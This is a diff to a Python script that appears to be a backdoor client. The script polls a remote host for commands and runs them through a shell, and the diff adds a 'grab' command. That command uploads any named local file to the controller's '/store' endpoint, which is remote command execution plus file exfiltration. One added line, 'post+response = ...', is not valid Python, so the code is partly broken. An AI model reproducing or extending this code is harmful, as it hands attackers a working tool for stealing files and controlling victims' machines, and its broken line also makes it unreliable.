@@ -3,6 +3,7 @@
 import subprocess
 import requests
 import time
+import os
 
 def main():
     #
@@ -20,6 +21,22 @@ def main():
             #
             break
             #
+        elif('grab' in command):
+            #
+            grab,path = command.split("*")
+            #
+            if(os.path.exists(path)):
+                #
+                url = host+"/store"
+                #
+                files = {'file':open(path,'rb')}
+                #
+                r = requests.post(url, files=files)
+                #
+            else:
+                #
+                post+response = requests.post(url=host,data="[!] Couldn't gather item [!]")
+                #
         else:
             #
             CMD = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
